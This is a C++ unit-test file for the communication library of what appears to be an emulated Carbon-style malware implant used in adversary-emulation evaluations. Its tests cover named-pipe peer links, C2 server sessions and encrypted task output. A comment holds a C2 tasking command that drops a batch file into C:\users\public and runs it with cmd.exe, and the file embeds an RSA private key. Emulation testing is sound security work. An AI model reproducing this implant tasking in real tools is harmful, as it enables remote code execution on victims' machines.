#include <gtest/gtest.h>
#include <gmock/gmock.h>
#include <testing.h>
#include <CommLib.hpp>
#include <thread>

using ::testing::_;
using ::testing::AtLeast;
using ::testing::DoAll;
using ::testing::Invoke;
using ::testing::Return;
using ::testing::SaveArg;
using ::testing::SetArgPointee;
using ::testing::StrEq;


// Test fixture for shared data
class TestCommLib : public ::testing::Test {
protected:
    MockWinApiWrapper api_wrapper;
    static constexpr LPCSTR mock_computer_name = "MOCKHOST";
    HANDLE h_mock_local_pipe = HANDLE(2345);
    std::string mock_timestamp = "2000-12-01 12:34:56";
};

TEST_F(TestCommLib, testCommParseConfigFile){
    ASSERT_TRUE(writeEncryptedConfig());
    try {
        CommLib commlib(configFileName);
    }
    catch (...){
        FAIL();
    }
    SUCCEED();
}

TEST_F(TestCommLib, testCommLibConfigure){
    // Catch all logging messages
    EXPECT_CALL(api_wrapper, CurrentUtcTimeWrapper()).WillRepeatedly(Return(mock_timestamp));
    EXPECT_CALL(api_wrapper, AppendStringWrapper(_, _)).Times(AtLeast(0));

    ASSERT_TRUE(writeEncryptedConfig());
    CommLib commlib(configFileName);
    ASSERT_TRUE(commlib.FetchConfiguration(&api_wrapper));
}
TEST_F(TestCommLib, testCommLibP2pSetup){
    LPVOID mock_buf;
    
    // Catch all logging messages
    EXPECT_CALL(api_wrapper, CurrentUtcTimeWrapper()).WillRepeatedly(Return(mock_timestamp));
    EXPECT_CALL(api_wrapper, AppendStringWrapper(_, _)).Times(AtLeast(0));

    EXPECT_CALL(api_wrapper, GetComputerNameWrapper(_, _))
        .Times(1)
        .WillOnce(DoAll(
            SaveArg<0>(&mock_buf),
            Invoke([&mock_buf]() { std::memcpy(mock_buf, mock_computer_name, strlen(mock_computer_name) + 1); }),
            SetArgPointee<1>(strlen(mock_computer_name)),
            Return(TRUE)
        ));
    EXPECT_CALL(api_wrapper, ConvertStringSecurityDescriptorToSecurityDescriptorWrapper(
        StrEq(L"D:(D;OICI;GA;;;BG)(D;OICI;GA;;;AN)(A;OICI;GRGWGX;;;AU)(A;OICI;GA;;;BA)"),
        SDDL_REVISION_1,
        _,
        NULL
    )).Times(1).WillOnce(Return(TRUE));
    EXPECT_CALL(api_wrapper, CreateNamedPipeWrapper(
        StrEq(L"\\\\.\\pipe\\dsnap"),
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        PIPE_IN_BUFFER,
        PIPE_OUT_BUFFER,
        0,
        _
    )).Times(1).WillOnce(Return(h_mock_local_pipe));
    EXPECT_CALL(api_wrapper, LocalFreeWrapper(_)).Times(1).WillOnce(Return(HANDLE(NULL)));
    
    CommLib commlib(configFileName);
    ASSERT_TRUE(commlib.p2pSetup(&api_wrapper));
    ASSERT_FALSE(commlib.p2pModeEnabled);
    ASSERT_EQ(commlib.localPipeAddress, std::string("\\\\.\\pipe\\dsnap"));
    ASSERT_EQ(commlib.peerPipeAddress, std::string("\\\\peerhost\\pipe\\dsnap"));
    ASSERT_EQ(commlib.responsePipeAddress, std::string("\\\\MOCKHOST\\pipe\\dsnap"));
    ASSERT_EQ(commlib.h_local_pipe, h_mock_local_pipe);
}

TEST_F(TestCommLib, testCommLibEstablishServerConnection){
    // Catch all logging messages
    EXPECT_CALL(api_wrapper, CurrentUtcTimeWrapper()).WillRepeatedly(Return(mock_timestamp));
    EXPECT_CALL(api_wrapper, AppendStringWrapper(_, _)).Times(AtLeast(0));

    ASSERT_TRUE(writeEncryptedConfig());
    /* For this test to work, this task must be set on the server:
    ./evalsC2client.py --set-task SOMEUUID '{"id": 1, "payload": "examplepayload.txt", "payload_dest": "C:\\users\\public\\test.bat", "cmd": "cmd.exe /c C:\\users\\public\\test.bat", "routing": "routingblob"}'
    
    There must also be a file with some data at Resources/payloads/Carbon/examplepayload.txt
    */

    rsa_enc::rsa_private_key_base64 = "MIIEoQIBAAKCAQEAxcvv98NsuX1Fuff9LDyV5fpp/MAbPvIYiMyoups9uhJz7v0E4MRCZQoM6w49rjmMTgsps3TJe8IR/6waEOTzevVBmma2LFd6Q+wlOnfdHFLa2YjCUyY1fvBP+7poc9U/hjf4mLs9hGih8wBUEPZtNYerA/aZM2bwpH7JjTXdQmCZ0Y7WalNn3me+Y9mEXQS16+uxXX3uEjB0zg9J+18H5dDRe40O91pLToAGKw/+s3bs9wuvLw0sArUQusC0T/msUOAawPgUDDv008w1PJblHRnDq6u1R1WD73VjDo1cGd/OfZH166JkVLiOXsrcgYL820cr1BuQuBoMthER5QUs7wIBEQKCAQAdFnYc6Ah1oXsx78NZVDQpWYgOlLi2buV9h4I5j0zXmU1IytsR/r54RT4ikScwNaOxH8JeJ8NG59V4bCHzbPahJBEtS1cGhVW+sck9TdzAZomYdf51o7ySqt6V9cQRCMWTvO/aOacqD2McNMERjaal/Vzp/p4PFqrrA5YcS6+Y0bZRa2DUwrhC4w6O6F+2TTuCeJy8QvYZ4FUc+mOh28c8pAHpvOnPUCI9LD27ksjwvkwzQCQH+8+lIebQuRqmQR/bsphPHJhmAxNiXP2BdfL/WkdkxM9VIKQQyZpjYHa48nlCTop/uu9vyydVr1gkp9OOmPth9nbjk8AAliElbD51AoGBAOJOrCsLobcz2YakqoxLeBbuTjWNnSsC/U5GdG7UMOjW3ZtBFX0TrQMpGmW3r9UH94tWHVrl7iCWsn2BspARw1xAoTYzIvCiYoR51qiFGRrlncmr6WQE+esbgRVJHS+BuDNhr7OxXlE5726OZHvOBlMxK5sFLJ47yh7L0oWdti1zAoGBAN+/ohjrHzIW7KGNAtOgTD2GaVIC5jmScOPCjc9A8Tqlyyk4P8Jh8sW4ny/eRtNGcVt3oJJ5O4dvgnGtvQige3dtgHJz332A97lWsGp6W7w74uFSiAKZFz0umWchrQVIHS9Y/2E8GbbvY63wJG+6OqStPn0BljBwyaEZdN4VoiOVAoGAXS90Ebl+0vc7c603KrWp61MRJRwxqEyGa4ZsLaKqujpbP+2fb7zOxRDswHjP7k6TG0GTneY04D4NQrzvLEOMrYQGJWBZrmD7Y7myvdxzv8f1rWTnoaeyM6Hp25aTjAg8ydzt/rJyIXI1acIpYCeoQF+KbQIhblTawWL8VSLSiy8CgYEAqxoSi4afYooAP0223hErPht9ty9kwp0pJqPV2rkw8JzmpwzldocjD6tMjgRURzXeNuMCUeQ8lL6vC6L594nH08w1DDp9ulOQQm932PQoCGoH2XtY8u2KPdhXML9mMTclYHE7wtObMYni0E45+xXwnAwCm9QJcFY/1Yvv9R+aGzUCgYBSb0kAPXlL7ZkwuTxfbvc10/93Ks8LDd5WaAb+gnTDFhqFGjNYNRsSF3S09oqfoITt0t4ufZfu4uqtDMFfCCmLA6K2J3asFSFV9A57f4NNtNivgMeoJFsWmLiW0obQRCbpQ1DY3AcgYPuiI8sTS0bobizCA3MenIWpyMlXT71VvQ==";
    
    // Task data being sent on C2 server:
    const int taskId = 1;
    const int taskCode = 0;
    const std::string taskRoutingBlob = "routingblob";
    const int taskPayloadLen = 18;
    const std::string taskConfig = "[CONFIG]\nname = C:\\users\\public\\test.bat\nexe = cmd.exe /c C:\\users\\public\\test.bat\n";

    CommLib commlib(configFileName);
    std::cout << "Creating http connection" << std::endl;
    auto httpConn = commlib.EstablishServerConnection(&api_wrapper);
    ASSERT_NE(httpConn, nullptr) << "Could not create connection";
    std::cout << "Getting next tasks" << std::endl;
    auto newTask = commlib.EstablishServerSession(&api_wrapper, httpConn);
    ASSERT_TRUE(newTask != nullptr) << "Something went wrong, task was empty.";
    std::cout << "Checking tasks:" << std::endl;
    EXPECT_EQ(newTask->getTaskId(), taskId) << "Task ID was " << newTask->getTaskId() << " instead of " << taskId;
    EXPECT_EQ(newTask->getTaskCode(), taskCode) << "Task code was " << newTask->getTaskCode() << " instead of " << taskCode;
    if (taskRoutingBlob.length() > 0){
        ASSERT_NE(newTask->getRoute(), nullptr);
        EXPECT_THAT(*(newTask->getRoute().get()), StrEq(taskRoutingBlob)) << "Task routing blob was " << *(newTask->getRoute().get()) << ", supposed to be " << taskRoutingBlob;
    }
    else {
        EXPECT_EQ(newTask->getRoute(), nullptr);
    }
    EXPECT_EQ(std::get<1>(newTask->getPayload()), taskPayloadLen) << "Task payload was wrong size, supposed to be " << taskPayloadLen;
    auto config = newTask->getConfig();
    ASSERT_NE(config, nullptr) << "No config received for task";
    auto received_config = *(newTask->getConfig().get());
    EXPECT_THAT(received_config, StrEq(taskConfig)) << "Received incorrect task config: " << received_config;
}

TEST_F(TestCommLib, testDLLRun){
    // Catch all logging messages
    EXPECT_CALL(api_wrapper, CurrentUtcTimeWrapper()).WillRepeatedly(Return(mock_timestamp));
    EXPECT_CALL(api_wrapper, AppendStringWrapper(_, _)).Times(AtLeast(0));

    ASSERT_TRUE(writeEncryptedConfig());
    
    LPVOID mock_buf;

    std::string output = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.";
    int task_id = 5;
    std::string object_id = "objectIdString";
    std::vector<char> encrypted_output = cast128_enc::Cast128Encrypt(std::vector<char>(output.begin(), output.end()), cast128_enc::kCast128Key); 
    std::string output_file_path = "C:\\mock\\output\\file\\logFile.dat"; 

    // task_id | "1" | task_log_filepath | object_id
    std::string task_output_metadata = std::to_string(task_id) + taskInfoSeperator + "1" + taskInfoSeperator + output_file_path + taskInfoSeperator + object_id;
    std::vector<char> encrypted_task_output_metadata = cast128_enc::Cast128Encrypt(std::vector<char>(task_output_metadata.begin(), task_output_metadata.end()), cast128_enc::kCast128Key); 

    EXPECT_CALL(api_wrapper, GetComputerNameWrapper(_, _))
        .Times(1)
        .WillOnce(DoAll(
            SaveArg<0>(&mock_buf),
            Invoke([&mock_buf]() { std::memcpy(mock_buf, mock_computer_name, strlen(mock_computer_name) + 1); }),
            SetArgPointee<1>(strlen(mock_computer_name)),
            Return(TRUE)
        ));
    EXPECT_CALL(api_wrapper, ConvertStringSecurityDescriptorToSecurityDescriptorWrapper(
        StrEq(L"D:(D;OICI;GA;;;BG)(D;OICI;GA;;;AN)(A;OICI;GRGWGX;;;AU)(A;OICI;GA;;;BA)"),
        SDDL_REVISION_1,
        _,
        NULL
    )).Times(1).WillOnce(Return(TRUE));
    EXPECT_CALL(api_wrapper, CreateNamedPipeWrapper(
        StrEq(L"\\\\.\\pipe\\dsnap"),
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        PIPE_IN_BUFFER,
        PIPE_OUT_BUFFER,
        0,
        _
    )).Times(1).WillOnce(Return(h_mock_local_pipe));
    EXPECT_CALL(api_wrapper, LocalFreeWrapper(_)).Times(1).WillOnce(Return(HANDLE(NULL)));
    EXPECT_CALL(api_wrapper, ConnectNamedPipeWrapper(h_mock_local_pipe, NULL)).Times(1).WillOnce(Return(FALSE));
    EXPECT_CALL(api_wrapper, GetLastErrorWrapper()).Times(1).WillOnce(Return(1));

    EXPECT_CALL(api_wrapper, CloseHandleWrapper(h_mock_local_pipe)).Times(1);

    // getReportableTasks
    EXPECT_CALL(api_wrapper, FileExistsWrapper(
        StrEq(finishedTasks)
    )).Times(1).WillOnce(Return(TRUE));
    EXPECT_CALL(api_wrapper, ReadFileIntoVectorWrapper(
        StrEq(finishedTasks),
        _
    )).Times(1).WillOnce(DoAll(
        SetArgPointee<1>(TRUE),
        Return(encrypted_task_output_metadata)
    ));
    EXPECT_CALL(api_wrapper, ClearFileWrapper(
        StrEq(finishedTasks)
    )).Times(1);

    // BuildBlob
    EXPECT_CALL(api_wrapper, ReadFileIntoVectorWrapper(
        StrEq(output_file_path),
        _
    )).Times(1).WillOnce(DoAll(
        SetArgPointee<1>(TRUE),
        Return(encrypted_output)
    ));

    // TODO HTTP call mocking
    
    // run CommLib::run
    commLibTestingMode = TRUE;
    ASSERT_EQ(CommLib::run(&api_wrapper), ERROR_SUCCESS);
}
